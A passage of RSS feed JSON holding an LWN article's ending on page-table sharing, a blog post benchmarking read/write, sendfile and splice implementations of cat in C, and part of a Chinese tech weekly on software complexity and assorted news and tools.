href=\"https://man7.org/linux/man-pages/man2/mremap.2.html\"><tt>mremap()</tt></a>\nand all users will see the change.\n</p><p>\nIt appears that use of <tt>mremap()</tt> is actually part of the expected\npattern for PTE-shared memory regions.  The <tt>mmap()</tt> call that is\nrequired to create the region will populate that region with anonymous\nmemory; there is no way to request that file-backed memory be used instead.\nBut it <i>is</i> possible to use <tt>mremap()</tt> to dump that initial\nmapping and substitute file-backed memory afterward.  So applications\nwanting to use shared page tables with file-backed memory will have to\nperform this extra step to set things up correctly.\n</p><p>\nThe developers at the LSFMM session were clear that they found this whole\nconcept to be somewhat frightening.  So far, the reaction to this patch\nseries has (from a memory-management point of view) been relatively\nsubdued, with the exception of David Hildenbrand, who is <a href=\"https://lwn.net/ml/linux-mm/397f3cb2-1351-afcf-cd87-e8f9fb482059@redhat.com/\">pushing</a>\nfor a different sort of solution.  He would rather see a mechanism that\nwould automatically share page tables when mappings are shared, without\nrequiring application-level changes.  That would make the benefits of\nsharing more widely available while exposing fewer internal\nmemory-management details.\n</p><p>\nAutomatic sharing would need to have different semantics, though; otherwise\napplications will be surprised when an <tt>mprotect()</tt> or\n<tt>mremap()</tt> call in another process changes their mappings.  Though\nit was not stated in this version of Aziz's patch posting, the sense from\nthe LSFMM session was that the altered semantics were desirable.  If that\nis the case, fully automatic sharing will not be possible, since\napplications would have to opt in to that behavior.\n</p><p>\nEither way, it looks like this particular patch set needs more work and\ndiscussion before it can find its way into the mainline.  Until then,\napplications depending on sharing memory between large numbers of processes\nwill continue to pay a high page-table cost.<br clear=\"all\"></p><table>\n           <tbody><tr><th colspan=\"2\">Index entries for this article</th></tr>\n           <tr><td><a href=\"https://lwn.net/Kernel/Index\">Kernel</a></td><td><a href=\"https://lwn.net/Kernel/Index#Memory_management-Page-table_sharing\">Memory management/Page-table sharing</a></td></tr>\n            </tbody></table><br clear=\"all\">\n<div>\n               <table align=\"right\"><tbody><tr><td>\n               \n               \n               \n               </td></tr></tbody></table>\n               </div>\n               <br clear=\"all\">\n               <table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
},
{
    "id": "https://ariadne.space/?p=483",
    "timestampUsec": "1658161178222954",
    "categories": [
        "Uncategorized",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "How efficient can cat(1) be?",
    "author": ";Ariadne Conill",
    "published": 1658068920,
    "updated": 1658068920,
    "alternate": [
        {
            "href": "https://ariadne.space/2022/07/17/how-efficient-can-cat1-be/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p>There have been a few initiatives in recent years to implement new a new userspace base system for Linux distributions as an alternative to the GNU coreutils and BusyBox.  Recently, one of the authors of one of these proposed implementations made the pitch in a few IRC channels <a href=\"https://vimuser.org/cat.c.txt\">that her <code>cat</code> implementation</a>, which was derived from OpenBSD’s implementation, was the most efficient.  But is it actually?</p>\n\n\n\n<h2>Understanding what <code>cat</code> actually does</h2>\n\n\n\n<p>At the most basic level, <code>cat</code> takes one or more files and dumps them to <code>stdout</code>.  But do we need to actually use <code>stdio</code> for this?  Actually, we don’t, and most competent <code>cat</code> implementations at least use <code>read(2)</code> and <code>write(2)</code> if not more advanced approaches.</p>\n\n\n\n<p>If we consider <code>cat</code> as a form of buffer copy between an arbitrary file descriptor and <code>STDOUT_FILENO</code>, we can understand what the most efficient strategy to use for <code>cat</code> would be: splicing.  Anything which isn’t doing splicing, after all, involves unnecessary buffer copies, and thus cannot be the most efficient.</p>\n\n\n\n<p>To get the best performance out of spliced I/O, we have to have some prerequisites:</p>\n\n\n\n<ul><li>The source and destination file descriptors should be unbuffered.</li><li>Any intermediate buffer should be a multiple of the filesystem block size.  In general, to avoid doing a <code>stat</code> syscall, we can assume that a multiple of <code>PAGE_SIZE</code> is likely acceptable.</li></ul>\n\n\n\n<h2>A simple <code>cat</code> implementation</h2>\n\n\n\n<p>The simplest way to implement <code>cat</code> is the way that it is done in BSD: using <code>read</code> and <code>write</code> on an intermediate buffer.  This results in two buffer copies, but has the best portability.  Most implementations of <code>cat</code> work this way, as it generally offers good enough performance.</p>\n\n\n\n<pre><code>/* This program is released into the public domain. */\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;err.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;limits.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;unistd.h&gt;\n\nvoid dumpfile(const char *path)\n{\n\tint srcfd = STDIN_FILENO;\n\tchar buf[PAGE_SIZE * 16];\n\tssize_t nread, nwritten;\n\tsize_t offset;\n\n\t/* POSIX allows - to represent stdin. */\n\tif (*path != '-')\n\t{\n\t\tsrcfd = open(path, O_RDONLY);\n\t\tif (srcfd &lt; 0)\n\t\t\terr(EXIT_FAILURE, \"open %s\", path);\n\t}\n\n\twhile ((nread = read(srcfd, buf, sizeof buf)) &gt;= 1)\n\t{\n\t\tfor (offset = 0; nread &gt; 0; nread -= nwritten, offset += nwritten)\n\t\t{\n\t\t\tif ((nwritten = write(STDOUT_FILENO, buf + offset, nread)) &lt;= 0)\n\t\t\t\terr(EXIT_FAILURE, \"write stdout\");\n\t\t}\n\t}\n\n\tif (srcfd != STDIN_FILENO)\n\t\t(void) close(srcfd);\n}\n\nint main(int argc, const char *argv[])\n{\n\tint i;\n\n\tfor (i = 1; i &lt; argc; i++)\n\t\tdumpfile(argv[i]);\n\n\treturn EXIT_SUCCESS;\n}</code></pre>\n\n\n\n<h2>Implementing spliced I/O</h2>\n\n\n\n<p>Linux has no shortage of ways to perform spliced I/O.  For our <code>cat</code> implementation, we have two possible ways to do it.</p>\n\n\n\n<p>The first possible option is the venerable <code>sendfile</code> syscall, which was <a href=\"https://yarchive.net/comp/linux/sendfile.html\">originally added to improve the file serving performance of web servers</a>.  Originally, <code>sendfile</code> required the destination file descriptor to be a socket, but this restriction was removed in Linux 2.6.33.  Unfortunately, <code>sendfile</code> is not perfect: because it only supports file descriptors which can be memory mapped, we must use a different strategy when using copying from <code>stdin</code>.</p>\n\n\n\n<pre><code>/* This program is released into the public domain. */\n#include &lt;stdbool.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;err.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;limits.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/sendfile.h&gt;\n\nbool spliced_copy(int srcfd)\n{\n\tssize_t nwritten;\n\toff_t offset = 0;\n\n\tdo\n\t{\n\t\tnwritten = sendfile(STDOUT_FILENO, srcfd, &amp;offset,\n\t\t\t\t    PAGE_SIZE * 16);\n\t\tif (nwritten &lt; 0)\n\t\t\treturn false;\n\t} while (nwritten &gt; 0);\n\n\treturn true;\n}\n\nvoid copy(int srcfd)\n{\n\tchar buf[PAGE_SIZE * 16];\n\tsize_t nread, nwritten, offset;\n\n\twhile ((nread = read(srcfd, buf, sizeof buf)) &gt;= 1)\n\t{\n\t\tfor (offset = 0; nread &gt; 0;\n\t\t     nread -= nwritten, offset += nwritten)\n\t\t{\n\t\t\tif ((nwritten = write(STDOUT_FILENO,\n\t\t\t\t\t      buf + offset, nread)) &lt;= 0)\n\t\t\t\terr(EXIT_FAILURE, \"write stdout\");\n\t\t}\n\t}\n}\n\nvoid dumpfile(const char *path)\n{\n\tint srcfd = STDIN_FILENO;\n\tchar buf[PAGE_SIZE * 16];\n\n\t/* POSIX allows - to represent stdin. */\n\tif (*path != '-')\n\t{\n\t\tsrcfd = open(path, O_RDONLY);\n\t\tif (srcfd &lt; 0)\n\t\t\terr(EXIT_FAILURE, \"open %s\", path);\n\t}\n\n\t/* Fall back to traditional copy if the spliced version fails. */\n\tif (!spliced_copy(srcfd))\n\t\tcopy(srcfd);\n\n\tif (srcfd != STDIN_FILENO)\n\t\t(void) close(srcfd);\n}\n\nint main(int argc, const char *argv[])\n{\n\tint i;\n\tint stdout_flags;\n\n\tstdout_flags = fcntl(STDOUT_FILENO, F_GETFL);\n\tif (stdout_flags &lt; 0)\n\t\terr(EXIT_FAILURE, \"fcntl(STDOUT_FILENO, F_GETFL)\");\n\tstdout_flags &amp;= ~O_APPEND;\n\tif (fcntl(STDOUT_FILENO, F_SETFL, stdout_flags) &lt; 0)\n\t\terr(EXIT_FAILURE, \"fcntl(STDOUT_FILENO, F_SETFL)\");\n\n\tfor (i = 1; i &lt; argc; i++)\n\t\tdumpfile(argv[i]);\n\n\treturn EXIT_SUCCESS;\n}</code></pre>\n\n\n\n<p>Another approach is to use <code>splice</code> and a pipe.  This allows for true zero-copy I/O in userspace, as a pipe is simply implemented as a 64KB ring buffer in the kernel.  In this case, we just use two splice operations per block of data we want to copy: one to move the data to the pipe and another to move the data from the pipe to the output file.</p>\n\n\n\n<pre><code>/* This program is released into the public domain. */\n#define _GNU_SOURCE\n#include &lt;stdbool.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;err.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;limits.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/sendfile.h&gt;\n\n#define BLOCK_SIZE ((PAGE_SIZE * 16) - 1)\n\nbool spliced_copy(int srcfd)\n{\n\tint pipefd[2];\n\tssize_t nread, nwritten;\n\toff_t in_offset = 0;\n\tbool ret = true;\n\n\tif (pipe(pipefd) &lt; 0)\n\t\terr(EXIT_FAILURE, \"pipe\");\n\n\tdo\n\t{\n\t\tnread = splice(srcfd, &amp;in_offset, pipefd[1], NULL,\n\t\t\t       BLOCK_SIZE, SPLICE_F_MOVE | SPLICE_F_MORE);\n\t\tif (nread &lt;= 0)\n\t\t{\n\t\t\tret = nread &lt; 0 ? false : true;\n\t\t\tgoto out;\n\t\t}\n\n\t\tnwritten = splice(pipefd[0], NULL, STDOUT_FILENO, NULL,\n\t\t\t\t  BLOCK_SIZE, SPLICE_F_MOVE | SPLICE_F_MORE);\n\t\tif (nwritten &lt; 0)\n\t\t{\n\t\t\tret = false;\n\t\t\tgoto out;\n\t\t}\n\t} while (nwritten &gt; 0);\n\nout:\n\tclose(pipefd[0]);\n\tclose(pipefd[1]);\n\n\treturn ret;\n}\n\nvoid copy(int srcfd)\n{\n\tchar buf[PAGE_SIZE * 16];\n\tsize_t nread, nwritten, offset;\n\n\twhile ((nread = read(srcfd, buf, sizeof buf)) &gt;= 1)\n\t{\n\t\tfor (offset = 0; nread &gt; 0;\n\t\t     nread -= nwritten, offset += nwritten)\n\t\t{\n\t\t\tif ((nwritten = write(STDOUT_FILENO,\n\t\t\t\t\t      buf + offset, nread)) &lt;= 0)\n\t\t\t\terr(EXIT_FAILURE, \"write stdout\");\n\t\t}\n\t}\n}\n\nvoid dumpfile(const char *path)\n{\n\tint srcfd = STDIN_FILENO;\n\tchar buf[PAGE_SIZE * 16];\n\n\t/* POSIX allows - to represent stdin. */\n\tif (*path != '-')\n\t{\n\t\tsrcfd = open(path, O_RDONLY);\n\t\tif (srcfd &lt; 0)\n\t\t\terr(EXIT_FAILURE, \"open %s\", path);\n\n\t\t(void) posix_fadvise(srcfd, 0, 0, POSIX_FADV_SEQUENTIAL);\n\t}\n\n\t/* Fall back to traditional copy if the spliced version fails. */\n\tif (!spliced_copy(srcfd))\n\t\tcopy(srcfd);\n\n\tif (srcfd != STDIN_FILENO)\n\t\t(void) close(srcfd);\n}\n\nint main(int argc, const char *argv[])\n{\n\tint i;\n\tint stdout_flags;\n\n\tstdout_flags = fcntl(STDOUT_FILENO, F_GETFL);\n\tif (stdout_flags &lt; 0)\n\t\terr(EXIT_FAILURE, \"fcntl(STDOUT_FILENO, F_GETFL)\");\n\tstdout_flags &amp;= ~O_APPEND;\n\tif (fcntl(STDOUT_FILENO, F_SETFL, stdout_flags) &lt; 0)\n\t\terr(EXIT_FAILURE, \"fcntl(STDOUT_FILENO, F_SETFL)\");\n\n\tfor (i = 1; i &lt; argc; i++)\n\t\tdumpfile(argv[i]);\n\n\treturn EXIT_SUCCESS;\n}</code></pre>\n\n\n\n<h2>Honorable mention: <code>copy_file_range</code></h2>\n\n\n\n<p>While <code>copy_file_range</code> is not really that relevant to a <code>cat</code> implementation, if both the source and output files are normal files, you can use it to get even faster performance than using splice, as the kernel handles all of the details on its own.  An optimized <code>cat</code> might try this strategy and then downgrade to <code>splice</code>, <code>sendfile</code>, and the normal <code>read</code> and <code>write</code> loop.</p>\n\n\n\n<h2>Performance comparison</h2>\n\n\n\n<p>To measure the performance of each strategy, we can simply use <code>dd</code> as a sink, running each cat program piped into <code>dd of=/dev/null bs=64K iflag=fullblock</code>.  The runs in the table below are averaged across 1000 runs on a 8GB RAM Linode, using a 4GB file in <code>tmpfs</code>.</p>\n\n\n\n<figure><table><thead><tr><th>Strategy</th><th>Throughput</th></tr></thead><tbody><tr><td><code>cat-simple</code> (<code>read</code> and <code>write</code> loop)</td><td>3.6 GB/s</td></tr><tr><td><code>cat-sendfile</code></td><td>6.4 GB/s</td></tr><tr><td><code>cat-splice</code></td><td>11.6 GB/s</td></tr></tbody></table></figure>\n\n\n\n<p>If you are interested in using these implementations in your own <code>cat</code> implementation, you may do so under any license terms you wish.</p>"
    },
    "origin": {
        "streamId": 24,
        "title": "Ariadne's Space",
        "htmlUrl": "https://ariadne.space/",
        "feedUrl": "https://ariadne.space/feed/"
    }
},
{
    "id": "http://www.ruanyifeng.com/blog/2022/06/weekly-issue-210.html",
    "timestampUsec": "1658241091003658",
    "categories": [
        "Weekly",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "科技爱好者周刊（第 210 期）：为什么软件变得复杂",
    "author": "",
    "published": 1655426220,
    "updated": 1655426220,
    "alternate": [
        {
            "href": "http://www.ruanyifeng.com/blog/2022/06/weekly-issue-210.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p>这里记录每周值得分享的科技内容，周五发布。</p>\n<p>本杂志开源（GitHub: <a href=\"https://github.com/ruanyf/weekly\">ruanyf/weekly</a>），欢迎提交 issue，投稿或推荐科技内容。</p>\n\n<p>周刊讨论区的帖子<a href=\"https://github.com/ruanyf/weekly/issues/2426\">《谁在招人？》</a>，提供大量程序员就业信息，欢迎访问或发布工作/实习岗位。</p>\n\n<h2>封面图</h2>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061615.webp\" alt=\"\" title=\"\"></p>\n\n<p>中国科学家绘制的世界首幅、最详细的1:250万月球全月地质图发布，统计出月球包含12341个撞击坑、17种岩石、14类地质构造。（<a href=\"http://www.cnsa.gov.cn/n6758823/n6758838/c6840495/content.html\">via</a>）</p>\n\n<h2>本周话题：为什么软件变得复杂</h2>\n\n<p>我一直认为，软件开发的最大关注点，就是避免复杂性。软件设计越简单越好，太多的程序员以构建复杂的解决方案为荣。</p>\n\n<p>但是，本周有一篇文章让我反思，我的想法是不现实的：<strong>软件肯定会越变越复杂。</strong></p>\n\n<p>（一）</p>\n\n<p>这篇文章的作者是 Saleforce 公司的前端工程师诺拉·劳森（Nolan Lawson），题目就叫做<a href=\"https://nolanlawson.com/2022/06/09/the-collapse-of-complex-software/\">《复杂软件的崩溃》</a>（下图）。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061407.webp\" alt=\"\" title=\"\"></p>\n\n<p>大家可能知道，Salesforce 是一家世界级软件公司，专门开发企业软件，以产品复杂而闻名。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061406.webp\" alt=\"\" title=\"\"></p>\n\n<p>所以，这件事情很讽刺。一家出产复杂软件的公司，自家的著名程序员公开说，复杂软件会崩溃。</p>\n\n<p>当然，他在文章里面没提 Salesforce 的名字，但是怎么读都像在写亲身经历。下面摘录一段他的原文和配图，大家品味一下。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061408.webp\" alt=\"\" title=\"\"></p>\n\n<blockquote>\n  <p>\"任何在科技行业工作足够长的人，尤其是在大公司工作的人，都曾见过下面的场景。</p>\n\n<p>有一个遗留系统，很大很复杂，没有人完全理解它是如何工作的。</p>\n\n<p>架构师被要求\"修复\"系统，他们找来一块大的白板，把这个大系统分解成很多方框和箭头。对于遇到的问题，他们的解决方案就是......添加更多方框和箭头。没有任何一个可以从系统中消去，每个人都只是加上自己的那部分。</p>\n</blockquote>\n\n<p>这一段是不是写得很形象，就像是日常场景的描述。</p>\n\n<p>根据他的文章，我整理了一下，Saleforce 内部的情况大概是这样的。</p>\n\n<blockquote>\n  <ol start=\"1\">\n<li>客户的需求非常复杂。为了满足这些需求，大型软件不可避免变得复杂。</li>\n<li>软件公司的管理者真正在意的不是系统的复杂性，而是利润。只要软件能赚钱，高层并不在意软件变得复杂。</li>\n<li>软件复杂性都落到少数架构师和高级程序员的头上。每个人加上自己的解决方案（方框和箭头），让软件越来越复杂，然后不可避免地，他们就会在一段时间后离开公司。</li>\n<li>复杂系统最终变得难以理解和维护，唯一的解决方法就是放弃旧系统，从头开始写一个新系统。</li>\n</ol>\n</blockquote>\n\n<p>所以，诺拉·劳森的结论很悲观：<strong>怎么解决软件的复杂性？解决不了。最后就是你走人，公司把软件推倒重来。</strong></p>\n\n<p>这就是一个大厂高级程序员的真实想法。国内的情况其实差不多，上面的描述完全适用于 BAT 内部的复杂系统。</p>\n\n<p>（二）</p>\n\n<p>诺拉·劳森还说了一个观点。大家通常认为，复杂系统往往会在经济繁荣的时候崩溃，因为业务太多，支撑不过来，但他认为不是这样的，<strong>系统崩溃往往发生在经济收缩期。</strong></p>\n\n<p>经济繁荣时期，软件公司会大量雇佣新员工，投入更多的财力和人力，支撑复杂系统。等到经济收缩期，公司开始减少投入、冻结招聘或裁员，复杂系统可能就会在这个时候出问题，变得难以维护。</p>\n\n<p>现在就是经济收缩期，那么接下来，会不会就是软件故障的高发期，我们将看到很多复杂系统的崩溃？</p>\n\n<h2>前端高频面试题（2022版）</h2>\n\n<p>这两年，客观地说，前端开发的热度有所下降。主要原因是前端技术逐步稳定，以及智能手机的普及度见顶了。</p>\n\n<p>但是，前端依然是 IT 行业中最活跃的分支。一年一度的 <a href=\"https://octoverse.github.com/\">GitHub 调查</a>中，JavaScript 多年来一直稳居第一，TypeScript 更是快速上升到今年的第四位，仅次于 Python 和 Java。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061616.webp\" alt=\"\" title=\"\"></p>\n\n<p>技术稳定带来的一个后果，就是新框架、新工具少了，大家更关注已有框架/工具的改进和功能增加。</p>\n\n<p>大厂的前端团队也转向了精细化探索，注重如何做得更细、更好，垂直化的技术领域（比如可视化、工程化等）得到了更多的关注。企业的用人要求也越来越高，从能够上手工作就可以要人，变成了要求深入某个领域。</p>\n\n<p>总的来说，<ins>现在的前端开发处在下图右侧的那个椭圆，比前一个阶段的难度上升了</ins>。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061617.webp\" alt=\"\" title=\"\"></p>\n\n<p>如果你已经有一定的前端开发基础，近期打算应聘前端岗位，这里有一份有用的资料，可以帮助大家准备面试。</p>\n\n<p>这份资料就是 <strong>《前端大厂的高频面试题（2022版）》</strong>，一共有174页，收集了最新的面试题，由国内著名的程序员培训平台\"极客时间\"联系国内大厂制作。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061620.webp\" alt=\"\" title=\"\"></p>\n\n<p>所有的题目都分门别类，由浅入深排列，每道题都附有答案详解，方便大家知识梳理、准备面试。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061618.webp\" alt=\"\" title=\"\"></p>\n\n<p>此外，还会额外赠送 <strong>《三位资深程序员的面试跳槽经验分享》</strong>，分享技术之外的跳槽准备、简历准备、面试应对......这些值得借鉴的前人经验。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061619.webp\" alt=\"\" title=\"\"></p>\n\n<p>微信扫描上方二维码，就可以 <strong>免费领取</strong> 这份前端面试资料。添加客服后，请耐心等待，后台是手动通过的。</p>\n\n<p>最后提醒一下，<ins>这份资料不适合刚刚学习前端的学生，更适合有前端开发基础和编程经验的从业人员。</ins></p>\n\n<h2>科技动态</h2>\n\n<p>1、<a href=\"https://gizmodo.com/vr-researches-simulate-kisses-with-ultrasonic-transduce-1848849489\">虚拟接吻</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/220204/bg2022043003.webp\" alt=\"\" title=\"\"></p>\n\n<p>卡内基梅隆大学开发了一种新技术，让 VR 头盔的佩戴者可以感受到虚拟接吻。具体做法是，头盔向嘴唇发射超声波，里面包含了一些微小颗粒，让嘴唇、牙齿甚至舌头产生触感。</p>\n\n<p>上图可以看到，VR 头盔的下方安装了一排超声波发生器，对准红点的位置发射。科学家开玩笑，可以用它开发\"接吻机\"。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/220204/bg2022043004.webp\" alt=\"\" title=\"\"></p>\n\n<p>除了产生嘴唇的触感，这种技术还可以在游戏中，让用户感受到风拂过脸部、蜘蛛网碰到脸，甚至食物和饮料进入嘴里的虚拟感受。</p>\n\n<p>上图是一只巨大的虚拟蜘蛛将大量毒药倾泻到用户身上，用户可以感觉到毒药溅到嘴唇上。</p>\n\n<p>2、<a href=\"http://www.lanxiongsports.com/posts/view/id/22687.html\">LED 篮球场</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022060807.webp\" alt=\"\" title=\"\"></p>\n\n<p>5月30日，国际篮联正式宣布，允许篮球世界杯等大赛启用 LED 篮球场。</p>\n\n<p>传统的篮球场都是木地板，木头具有弹性，可以吸收震动，保护球员。现在，最新的 LED 玻璃也已经能够提供足够的弹性。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022060808.webp\" alt=\"\" title=\"\"></p>\n\n<p>LED 球场有很多好处，省去了划线的麻烦，能够快速切换成篮球场、手球场、排球场、羽毛球场。</p>\n\n<p>并且，它自身能发光，可以作为显示屏，实时显示比赛数据，并且配合球场活动，营造气氛。在黑暗中，界线依然保持醒目。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022060809.webp\" alt=\"\" title=\"\"></p>\n\n<p>3、<a href=\"https://bjoernkarmann.dk/occlusion-grotesque\">树皮字体</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202205/bg2022050302.webp\" alt=\"\" title=\"\"></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202205/bg2022050306.webp\" alt=\"\" title=\"\"></p>\n\n<p>五年前，一个丹麦艺术家将字体刻在一棵树上，想看看随着树木的成长，字体会变成什么样，也就是大自然会怎样呈现字体。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202205/bg2022050307.webp\" alt=\"\" title=\"\"></p>\n\n<p>下面是字母 a 和 o 在五年中的变化。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202205/bg2022050303.webp\" alt=\"\" title=\"\"></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202205/bg2022050304.webp\" alt=\"\" title=\"\"></p>\n\n<p>这些字体应用到印刷品，就是下面的样子。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202205/bg2022050305.webp\" alt=\"\" title=\"\"></p>\n\n<p>他发现，这些字母主要是横向成长，变得更宽更粗，高度反而变化不大。这说明，树木成形后，树干高度就基本不再变化了，开始不断长粗。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202205/bg2022050308.webp\" alt=\"\" title=\"\"></p>\n\n<p>4、<a href=\"https://www.cnbc.com/2022/04/26/biden-blocks-sales-of-inefficient-lightbulbs-reversing-trump-policy-.html\">禁止白炽灯泡</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202205/bg2022050502.webp\" alt=\"\" title=\"\"></p>\n\n<p>拜登政府宣布，美国将禁止销售每瓦产生低于45流明的灯泡。这实际上禁掉了白炽灯泡。</p>\n\n<p>这个决定是为了提高照明的能量效率。一般来说，白炽灯泡每瓦的发光量在10流明左右，LED 灯泡则可以达到每瓦100流明以上。</p>\n\n<h2>文章</h2>\n\n<p>1、<a href=\"https://www.chuapp.com/?a=index&amp;c=Article&amp;id=288712\">我为什么与中国游戏发行商签约又分手</a>（中文）</p>\n\n<p>这是一篇日本独立游戏开发者的文章，被译成了中文。作者以亲身经历，解释了目前的独立游戏的发行制度和现状。</p>\n\n<p>2、<a href=\"https://finance.sina.com.cn/tech/2022-06-14/doc-imizirau8363822.shtml\">Intel 4 工艺宣布</a>（中文）</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061609.webp\" alt=\"\" title=\"\"></p>\n\n<p>上周，英特尔公司正式宣布了 Intel 4 工艺。这是英特尔公司第一次将 EUV 技术用于 CPU 的生产，实现了7纳米的制程，开始追赶台积电。本文介绍该工艺的一些情况。</p>\n\n<p>3、<a href=\"https://icloudnative.io/posts/budget-nas/\">我如何搭建家用 NAS</a>（中文）</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022060906.webp\" alt=\"\" title=\"\"></p>\n\n<p>本文详细记录了作者选购硬件、安装软件，搭建一台 22TB 的家用 NAS （网络存储）服务器的过程，可以当作自己架设 NAS 的参考。这里是中文翻译，另有<a href=\"https://mtlynch.io/budget-nas/\">英文原文</a>。（<a href=\"https://github.com/ruanyf/weekly/issues/2444\">@yangchuansheng</a> 投稿）</p>\n\n<p>4、<a href=\"https://ugmonk.com/blogs/journal/analog-the-simplest-productivity-system\">最简单的任务管理系统</a>（英文）</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202202/bg2022021201.webp\" alt=\"\" title=\"\"></p>\n\n<p>本文介绍作者自己发明的最简单任务管理系统，就是把每天的任务写在卡片上，用一个架子放在眼前，做完一件就划掉一件。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202202/bg2022021202.webp\" alt=\"\" title=\"\"></p>\n\n<p>5、<a href=\"https://www.backblaze.com/blog/free-image-hosting-with-cloudflare-transform-rules-and-backblaze-b2/\">使用 Cloudflare + Backblaze B2 打造一个免费的图像 CDN</a>（英文）</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202202/bg2022021604.webp\" alt=\"\" title=\"\"></p>\n\n<p>本文是一篇详细的教程，教你怎么把图片托管在 Backblaze B2 对象存储，然后连接到 Cloudflare 的 CDN 服务。两者都有免费额度，对于小网站来说，不用花钱就解决了图片的存储和带宽问题。</p>\n\n<p>6、<a href=\"https://nick.comer.io/post/ios-shortcuts\">如何用 iOS 快捷指令防止沉迷？</a>（英文）</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202201/bg2022010401.webp\" alt=\"\" title=\"\"></p>\n\n<p>作者发现自己在社交媒体上，浪费了大量时间。他想出了一个办法，制作了一个 iOS 快捷指令（shortcuts），只要一打开社交 App，就会跳出提示\"请专心工作\"。</p>\n\n<p>7、<a href=\"https://blog.fidelramos.net/photography/photography-workflow#5-replication-with-syncthing\">我的免费摄影软件工作流</a>（英文）</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/220204/bg2022040609.webp\" alt=\"\" title=\"\"></p>\n\n<p>作者是一个专业的摄影师，完全采用免费软件处理数码照片。本文介绍他的解决方案。</p>\n\n<p>8、<a href=\"https://cprimozic.net/blog/my-selfhosted-websites-architecture/#backup--disaster-recovery\">我在单个服务器上托管几十个网站</a>（英文）</p>\n\n<p>作者详细介绍，他如何在一个服务器上托管几十个网站，大部分是 API 调用。这里最大的难题还不是把服务架起来，而是如何同时维护和管理它们。</p>\n\n<p>9、<a href=\"https://tomtunguz.com/how-much-money-flowing-into-crypto/\">如何估算流入加密货币的资金</a>（英文）</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202202/bg2022020302.webp\" alt=\"\" title=\"\"></p>\n\n<p>多少资金流入了加密货币市场？这显然是无法准确计算的，作者想到了一个办法，可以间接估算。那就是看稳定币每月增长的发行量，上图是过去两年稳定币每个月的增长百分比。</p>\n\n<h2>工具</h2>\n\n<p>1、<a href=\"https://cloudmp3.cc/en/\">CloudMP3.cc</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/220204/bg2022041702.webp\" alt=\"\" title=\"\"></p>\n\n<p>一个云服务，可以将 SoundCloud 上面的音频，转成 mp3 下载。</p>\n\n<p>2、<a href=\"https://github.com/ToolJet/ToolJet\">ToolJet</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202203/bg2022031912.webp\" alt=\"\" title=\"\"></p>\n\n<p>一个低代码框架，用来开发内部工具。部署到服务器后，它有一个 Web 界面，通过拖拽，就可以连接各种数据源，生成各种应用或管理面板。</p>\n\n<p>3、<a href=\"https://secreter.github.io/ireader/index.html\">i 微信读书</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061503.webp\" alt=\"\" title=\"\"></p>\n\n<p>Chrome 浏览器插件，配合网页版微信读书使用，支持划线摘抄句子、划线生成分享图片、一键导出笔记等功能。（<a href=\"https://github.com/ruanyf/weekly/issues/2439\">@secreter</a> 投稿）</p>\n\n<p>4、<a href=\"https://github.com/sogou/workflow\">Sogou C++ Workflow</a></p>\n\n<p>搜狗公司开源的 C++ 服务器引擎，支撑搜狗几乎所有后端 C++ 在线服务，提供了大量异步服务的功能。（<a 